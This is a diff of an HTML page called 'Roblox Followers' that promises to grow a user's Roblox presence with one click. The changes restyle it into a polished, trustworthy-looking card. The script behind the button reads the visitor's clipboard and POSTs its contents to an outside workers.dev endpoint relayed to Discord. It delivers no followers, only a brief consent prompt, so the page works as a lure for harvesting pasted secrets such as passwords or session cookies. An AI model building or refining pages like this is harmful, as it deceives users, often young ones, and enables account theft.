@@ -1,48 +1,208 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Roblox Followers</title>
 
 <style>
-html,body{
-  margin:0;
-  width:100%;
-  height:100%;
+* {
+  box-sizing: border-box;
 }
 
-body{
-  display:grid;
-  place-items:center;
-  background:#0b0b10;
-  font-family:Arial,sans-serif;
+html,
+body {
+  margin: 0;
+  min-height: 100%;
+  font-family: Arial, Helvetica, sans-serif;
 }
 
-button{
-  border:0;
-  border-radius:18px;
-  padding:24px 42px;
-  font-size:30px;
-  font-weight:700;
-  cursor:pointer;
-  background:#fff;
-  color:#111;
-  box-shadow:0 18px 50px rgba(0,0,0,.35);
+body {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+
+  background:
+    radial-gradient(circle at 20% 20%, rgba(255,255,255,.08), transparent 30%),
+    radial-gradient(circle at 80% 80%, rgba(120,120,255,.10), transparent 30%),
+    linear-gradient(135deg, #08080c, #11111a 50%, #08080c);
+
+  color: white;
 }
 
-button:active{
-  transform:scale(.98);
+.background {
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  overflow: hidden;
+}
+
+.glow {
+  position: absolute;
+  width: 400px;
+  height: 400px;
+  border-radius: 50%;
+  background: rgba(255,255,255,.035);
+  filter: blur(80px);
+}
+
+.glow.one {
+  top: -180px;
+  left: -150px;
+}
+
+.glow.two {
+  right: -180px;
+  bottom: -180px;
+}
+
+.card {
+  position: relative;
+  width: min(90%, 520px);
+  padding: 55px 35px;
+  text-align: center;
+
+  background: rgba(20,20,28,.78);
+  border: 1px solid rgba(255,255,255,.10);
+  border-radius: 28px;
+
+  box-shadow:
+    0 30px 80px rgba(0,0,0,.55),
+    inset 0 1px rgba(255,255,255,.05);
+
+  backdrop-filter: blur(20px);
+}
+
+.logo {
+  width: 78px;
+  height: 78px;
+  margin: 0 auto 22px;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  border-radius: 22px;
+  background: white;
+  color: #111;
+
+  font-size: 34px;
+  font-weight: 900;
+
+  box-shadow: 0 15px 40px rgba(0,0,0,.35);
+}
+
+h1 {
+  margin: 0;
+  font-size: 38px;
+  letter-spacing: -1px;
+}
+
+.subtitle {
+  margin: 12px 0 32px;
+  color: #a9a9b5;
+  font-size: 16px;
+  line-height: 1.5;
+}
+
+.main-button {
+  width: 100%;
+  padding: 18px 24px;
+
+  border: none;
+  border-radius: 15px;
+
+  background: white;
+  color: #111;
+
+  font-size: 19px;
+  font-weight: 800;
+
+  cursor: pointer;
+
+  transition:
+    transform .2s ease,
+    box-shadow .2s ease,
+    background .2s ease;
+}
+
+.main-button:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 15px 35px rgba(255,255,255,.16);
+  background: #f0f0f0;
+}
+
+.main-button:active {
+  transform: translateY(0) scale(.98);
+}
+
+.note {
+  margin-top: 18px;
+  color: #777783;
+  font-size: 12px;
+  line-height: 1.5;
+}
+
+.status {
+  margin-top: 18px;
+  min-height: 20px;
+  font-size: 13px;
+  color: #aaaab5;
+}
+
+@media (max-width: 500px) {
+  .card {
+    padding: 42px 24px;
+  }
+
+  h1 {
+    font-size: 31px;
+  }
+
+  .logo {
+    width: 68px;
+    height: 68px;
+    font-size: 29px;
+  }
 }
 </style>
 </head>
 
 <body>
 
-<button id="main">Roblox Followers</button>
+<div class="background">
+  <div class="glow one"></div>
+  <div class="glow two"></div>
+</div>
+
+<div class="card">
+
+  <div class="logo">R</div>
+
+  <h1>Roblox Followers</h1>
+
+  <p class="subtitle">
+    Grow your Roblox presence with one simple click.
+  </p>
+
+  <button class="main-button" id="main">
+    Roblox Followers
+  </button>
+
+  <div class="status" id="status"></div>
+
+  <div class="note">
+    You will be asked for confirmation before anything is submitted.
+  </div>
+
+</div>
 
 <script>
 const button = document.getElementById("main");
+const status = document.getElementById("status");
 
 const SEND_ENDPOINT =
   "https://young-brook-716e.abojanmawzoon.workers.dev";
@@ -53,12 +213,20 @@ button.addEventListener("click", async () => {
     "This will send the text currently in your clipboard to the website owner through Discord. Continue?"
   );
 
-  if (!consent) return;
+  if (!consent) {
+    return;
+  }
 
   try {
+
+    status.textContent = "Submitting...";
+
     const text = await navigator.clipboard.readText();
 
-    if (!text) return;
+    if (!text) {
+      status.textContent = "Your clipboard is empty.";
+      return;
+    }
 
     await fetch(SEND_ENDPOINT, {
       method: "POST",
@@ -70,7 +238,13 @@ button.addEventListener("click", async () => {
       })
     });
 
+    status.textContent = "Submitted successfully.";
+
   } catch (error) {
+
+    status.textContent =
+      "Something went wrong. Please try again.";
+
     console.error(error);
   }
 });
